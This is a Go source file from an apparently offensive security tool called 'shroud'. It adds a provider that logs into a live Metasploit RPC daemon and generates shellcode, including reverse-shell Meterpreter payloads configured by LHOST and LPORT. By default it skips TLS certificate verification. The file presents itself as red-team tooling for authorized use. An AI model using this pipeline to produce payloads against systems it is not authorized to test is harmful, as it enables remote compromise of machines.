// Package msfrpc implements a c2.Provider backed by a running Metasploit RPC
// daemon (msfrpcd). Unlike the `metasploit` provider (which shells out to
// `msfvenom` for a stateless PIC-blob generation), msfrpc drives a LIVE Metasploit
// instance over its MessagePack RPC: it authenticates with auth.login, then calls
// module.execute on a payload module to generate the shellcode bytes. This is the
// path to use when you want server-side, session-aware generation (stagers tied to
// a running listener, datastore options resolved by the framework, etc.).
//
// Wire format (per the official Metasploit RPC API docs,
// https://docs.rapid7.com/metasploit/rpc-api/):
//
//   - Transport: HTTP POST to the daemon URL (typically https://host:port/api/),
//     Content-Type "binary/message-pack", body = a MessagePack array.
//   - Request array: ["method", arg1, arg2, ...] — the method name is the FIRST
//     element. auth.login is the only method that omits the auth token; every
//     other method takes the temporary token as its second element.
//   - Response: a MessagePack map (e.g. auth.login -> {"result":"success",
//     "token":"..."}; module.execute on a payload -> {"payload": <raw bytes>}).
//     Some msfrpcd versions wrap the result in a trailing array element; the
//     client unwraps either form.
//
// msfrpcd ships with a self-signed TLS cert by default, so the client skips
// certificate verification unless --msfrpc-insecure=false is set.
//
// This provider adds one dependency: github.com/vmihailenco/msgpack/v5 (pure-Go
// MessagePack). No live msfrpcd is required to BUILD or unit-test the provider —
// the tests serve canned msgpack responses via httptest. Runtime verification
// against a real msfrpcd (the exact module.execute payload result shape across
// versions) is the operator's on-target check; the framing follows the documented
// API.
//
// Reached only through `shroud generate --c2 msfrpc`, which is gated behind
// `shroud authorize`. See SECURITY.md — authorized use only.
package msfrpc

import (
	"bytes"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"shroud/internal/c2"

	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
	"github.com/vmihailenco/msgpack/v5"
)

const providerName = "msfrpc"

// provider implements c2.Provider.
type provider struct{}

func (provider) Name() string { return providerName }

func (provider) Help() string {
	return "msfrpc — shellcode from a LIVE Metasploit RPC daemon (--msfrpc-url, --msfrpc-user, --msfrpc-pass, --msfrpc-payload, --msfrpc-lhost, --msfrpc-lport)."
}

// AddFlags registers msfrpcd's flags on a flag set (scoped to `generate`).
func (provider) AddFlags(fs *pflag.FlagSet) {
	fs.String("msfrpc-url", "", "msfrpcd RPC URL, e.g. https://127.0.0.1:55553/api/")
	fs.String("msfrpc-user", "msf", "msfrpcd username")
	fs.String("msfrpc-pass", "", "msfrpcd password (required)")
	fs.String("msfrpc-payload", "", "payload module, e.g. windows/x64/exec, windows/x64/meterpreter/reverse_tcp")
	fs.String("msfrpc-lhost", "", "LHOST datastore option (reverse payloads)")
	fs.Int("msfrpc-lport", 0, "LPORT datastore option (reverse payloads)")
	fs.String("msfrpc-format", "raw", "output format (Format datastore option); raw = PIC bytes")
	fs.String("msfrpc-extra", "", "extra datastore KEY=VAL options, space-separated, e.g. CMD=calc.exe EXITFUNC=thread")
	fs.Bool("msfrpc-insecure", true, "skip TLS certificate verification (msfrpcd uses a self-signed cert by default)")
}

func (p provider) Preflight(cmd *cobra.Command) error {
	url := stringFlag(cmd, "msfrpc-url")
	if url == "" {
		return errors.New("--msfrpc-url is required for --c2 msfrpc (e.g. https://127.0.0.1:55553/api/)")
	}
	if stringFlag(cmd, "msfrpc-pass") == "" {
		return errors.New("--msfrpc-pass is required for --c2 msfrpc")
	}
	if stringFlag(cmd, "msfrpc-payload") == "" {
		return errors.New("--msfrpc-payload is required for --c2 msfrpc (e.g. windows/x64/exec)")
	}
	// Contact the daemon and confirm auth.login succeeds, so `shroud c2 preflight
	// msfrpc` actually verifies the server is reachable and the credentials work.
	// Unlike the shell-out providers, msfrpc's "environment" IS the running server,
	// so a live contact is the meaningful preflight.
	if err := p.loginCheck(cmd); err != nil {
		return fmt.Errorf("msfrpc preflight (auth.login failed): %w", err)
	}
	return nil
}

// loginCheck builds a client from the flags and attempts auth.login.
func (provider) loginCheck(cmd *cobra.Command) error {
	c := newClient(stringFlag(cmd, "msfrpc-url"), stringFlag(cmd, "msfrpc-user"), stringFlag(cmd, "msfrpc-pass"), boolFlag(cmd, "msfrpc-insecure"))
	return c.login()
}

func (p provider) Fetch(cmd *cobra.Command) (*c2.ShellcodeResult, error) {
	// Validate flags first (don't contact the server if misconfigured).
	if err := p.Preflight(cmd); err != nil {
		return nil, err
	}
	payloadName := stringFlag(cmd, "msfrpc-payload")
	c := newClient(stringFlag(cmd, "msfrpc-url"), stringFlag(cmd, "msfrpc-user"), stringFlag(cmd, "msfrpc-pass"), boolFlag(cmd, "msfrpc-insecure"))

	start := time.Now()
	if err := c.login(); err != nil {
		return nil, fmt.Errorf("msfrpc auth.login: %w", err)
	}

	// Build the datastore options hash for module.execute.
	opts := map[string]interface{}{}
	if lh := stringFlag(cmd, "msfrpc-lhost"); lh != "" {
		opts["LHOST"] = lh
	}
	if lp := intFlag(cmd, "msfrpc-lport"); lp != 0 {
		opts["LPORT"] = strconv.Itoa(lp)
	}
	if f := stringFlag(cmd, "msfrpc-format"); f != "" && f != "raw" {
		opts["Format"] = f
	}
	for k, v := range parseExtra(stringFlag(cmd, "msfrpc-extra")) {
		opts[k] = v
	}

	data, err := c.generatePayload(payloadName, opts)
	if err != nil {
		return nil, fmt.Errorf("msfrpc module.execute: %w", err)
	}
	if len(data) == 0 {
		return nil, errors.New("msfrpc returned an empty payload")
	}

	// Persist to a temp file for parity with the other providers (display path).
	tmp, err := os.MkdirTemp("", "shroud-msfrpc-*")
	if err != nil {
		return nil, fmt.Errorf("mktemp: %w", err)
	}
	outFile := filepath.Join(tmp, "shellcode.bin")
	if err := os.WriteFile(outFile, data, 0o600); err != nil {
		os.RemoveAll(tmp)
		return nil, fmt.Errorf("write shellcode: %w", err)
	}

	return &c2.ShellcodeResult{
		Bytes:     data,
		SavePath:  outFile,
		Name:      payloadName,
		Source:    "msfrpc:" + payloadName,
		BuildTime: time.Since(start).Round(time.Millisecond),
	}, nil
}

// parseExtra splits a "KEY=VAL KEY2=VAL2" string into a map.
func parseExtra(s string) map[string]string {
	out := map[string]string{}
	for _, f := range strings.Fields(s) {
		if i := strings.IndexByte(f, '='); i > 0 {
			out[f[:i]] = f[i+1:]
		}
	}
	return out
}

// --- msgpack-rpc client ------------------------------------------------------

// client is a minimal msfrpcd MessagePack-RPC client (flat-array request form,
// map response form — per the official Metasploit RPC API).
type client struct {
	url     string
	user    string
	pass    string
	insecure bool
	token   string
	httpc   *http.Client
}

func newClient(url, user, pass string, insecure bool) *client {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecure},
	}
	return &client{
		url:      url,
		user:     user,
		pass:     pass,
		insecure: insecure,
		httpc:    &http.Client{Transport: tr, Timeout: 30 * time.Second},
	}
}

// call sends one msgpack-rpc request and returns the decoded result. The request
// is the flat array ["method", args...]; the response is a msgpack map (or an
// array whose last element is the result map, which we unwrap).
func (c *client) call(method string, args ...interface{}) (interface{}, error) {
	reqArr := append([]interface{}{method}, args...)
	body, err := msgpack.Marshal(reqArr)
	if err != nil {
		return nil, fmt.Errorf("encode request: %w", err)
	}
	req, err := http.NewRequest(http.MethodPost, c.url, bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("build request: %w", err)
	}
	req.Header.Set("Content-Type", "binary/message-pack")
	resp, err := c.httpc.Do(req)
	if err != nil {
		return nil, fmt.Errorf("rpc request: %w", err)
	}
	defer resp.Body.Close()
	respBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("msfrpcd returned HTTP %d: %s", resp.StatusCode, strings.TrimSpace(string(respBytes)))
	}
	var decoded interface{}
	if err := msgpack.Unmarshal(respBytes, &decoded); err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}
	// Unwrap: some msfrpcd versions wrap the result as the last element of an
	// array; the documented form is a bare map. Handle both.
	if arr, ok := decoded.([]interface{}); ok && len(arr) > 0 {
		decoded = arr[len(arr)-1]
	}
	// Error map: {"error": true, "error_message": "...", ...}
	if m, ok := decoded.(map[string]interface{}); ok {
		if e, ok := m["error"].(bool); ok && e {
			msg, _ := m["error_message"].(string)
			if msg == "" {
				msg = fmt.Sprintf("%v", m)
			}
			return nil, fmt.Errorf("msfrpc: %s", msg)
		}
	}
	return decoded, nil
}

// login authenticates and stores the temporary token.
func (c *client) login() error {
	res, err := c.call("auth.login", c.user, c.pass)
	if err != nil {
		return err
	}
	m, ok := res.(map[string]interface{})
	if !ok {
		return fmt.Errorf("auth.login: unexpected response %T", res)
	}
	if r, _ := m["result"].(string); r != "success" {
		return fmt.Errorf("auth.login failed: result=%v", m["result"])
	}
	tok, _ := m["token"].(string)
	if tok == "" {
		return errors.New("auth.login: empty token in response")
	}
	c.token = tok
	return nil
}

// generatePayload calls module.execute on a payload module and returns the raw
// generated shellcode bytes. The response is {"payload": <bytes>}.
func (c *client) generatePayload(payloadName string, opts map[string]interface{}) ([]byte, error) {
	res, err := c.call("module.execute", c.token, "payload", payloadName, opts)
	if err != nil {
		return nil, err
	}
	m, ok := res.(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("module.execute: unexpected response %T", res)
	}
	switch p := m["payload"].(type) {
	case []byte:
		return p, nil
	case string:
		return []byte(p), nil
	default:
		return nil, fmt.Errorf("module.execute: no payload bytes in response (got %T); response=%v", p, m)
	}
}

// --- flag helpers ------------------------------------------------------------

func stringFlag(cmd *cobra.Command, name string) string {
	v, _ := cmd.Flags().GetString(name)
	return v
}

func intFlag(cmd *cobra.Command, name string) int {
	v, _ := cmd.Flags().GetInt(name)
	return v
}

func boolFlag(cmd *cobra.Command, name string) bool {
	v, _ := cmd.Flags().GetBool(name)
	return v
}

func init() {
	c2.Register(provider{})
}